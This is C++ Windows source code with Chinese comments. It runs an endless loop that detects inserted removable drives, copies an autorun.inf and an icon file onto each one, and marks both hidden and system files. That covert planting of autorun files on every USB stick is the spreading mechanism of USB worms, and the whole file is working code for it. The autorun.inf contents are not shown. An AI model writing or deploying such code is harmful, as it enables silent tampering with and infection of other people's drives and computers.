#include<string>
#include<Windows.h>
#include <iostream>
#include<vector>
#include<fstream>

using namespace std;
vector<wstring> check();
void removeFileNameFromPath(std::wstring& path);
bool IsUseable(wstring& path);

int main() {
	vector<wstring> strs;
	wstring command;
	wstring wrunpath;
	WCHAR run[260] = { 0 };
	GetModuleFileName(NULL, run, MAX_PATH);
	SetErrorMode(SEM_FAILCRITICALERRORS);
	wrunpath = run;
	removeFileNameFromPath(wrunpath);
	while (1) {
		strs = check();
		for (auto& i : strs) {
			wcout << i << endl;
			{
				std::ifstream  src(wrunpath + L"\\icon.ico", std::ios::binary);
				std::ofstream  dst(i + L":\\icon.ico", std::ios::binary | std::ios::ate);
				dst << src.rdbuf();
			}
			command = i + L":\\icon.ico";
			SetFileAttributes(command.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
			command = L"/c copy \"" + wrunpath + L"\\autorun.inf\" " + i + L":\\ /Y";
			{
				std::ifstream  src(wrunpath + L"\\autorun.inf", std::ios::binary);
				std::ofstream  dst(i + L":\\autorun.inf", std::ios::binary | std::ios::ate);
				dst << src.rdbuf();
			}
			command = i + L":\\autorun.inf";
			SetFileAttributes(command.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
			cout << "已经完成文件复制";
		}
		Sleep(2000);
	}
}



bool IsUseable(wstring& path)
{
	ULARGE_INTEGER nFreeBytesAvailable;
	ULARGE_INTEGER nTotalNumberOfBytes;
	ULARGE_INTEGER nTotalNumberOfFreeBytes;
	cout << "";
	if (GetDiskFreeSpaceEx(path.c_str(), &nFreeBytesAvailable, &nTotalNumberOfBytes, &nTotalNumberOfFreeBytes)) {
		if (nTotalNumberOfFreeBytes.QuadPart <= 1000) {
			cout << "可用空间不足:" << nFreeBytesAvailable.QuadPart << endl;
			return 0;
		}
		else {
			cout << "可用空间:" << nFreeBytesAvailable.QuadPart << endl;
			return 1;
		}
	}
	else {
		cout << "udisk unuseable" << endl;
		return 0;
	}
}
void removeFileNameFromPath(std::wstring& path) {
	// 找到最后一个'\\'的位置
	std::size_t lastSlashPos = path.find_last_of(L'\\');

	// 如果找到了最后一个'\\'
	if (lastSlashPos != std::wstring::npos) {
		// 截断字符串,将最后一个'\\'后面的所有字符删除
		path.erase(lastSlashPos);
	}
}

vector<wstring> check()
{
	vector<wstring> returns;
	int DSLength = GetLogicalDriveStrings(0, NULL);
	//通过GetLogicalDriveStrings()函数获取所有驱动器字符串信息长度。
	wchar_t* DStr = new wchar_t[DSLength];//用获取的长度在堆区创建一个c风格的字符串数组
	GetLogicalDriveStrings(DSLength, (LPTSTR)DStr);
	//通过GetLogicalDriveStrings将字符串信息复制到堆区数组中,其中保存了所有驱动器的信息。
	wstring a;
	int DType;
	int si = 0;
	for (int i = 0; i < DSLength / 4; ++i)
		//为了显示每个驱动器的状态，则通过循环输出实现，由于DStr内部保存的数据是A:\NULLB:\NULLC:\NULL，这样的信息，所以DSLength/4可以获得具体大循环范围
	{
		wchar_t dir[3] = { DStr[si],':','\\' };
		DType = GetDriveType(DStr + i * 4);
		//GetDriveType函数，可以获取驱动器类型，参数为驱动器的根目录
		if (DType == DRIVE_REMOVABLE)
		{
			cout << "cheak is useable" << endl;
			wchar_t tmp[] = { DStr[si] ,':' ,'\0'};
			wstring d(tmp);
			if (IsUseable(d)) {
				a = dir[0];
				returns.push_back(a);
			}
		}
		si += 4;
	}
	return returns;
}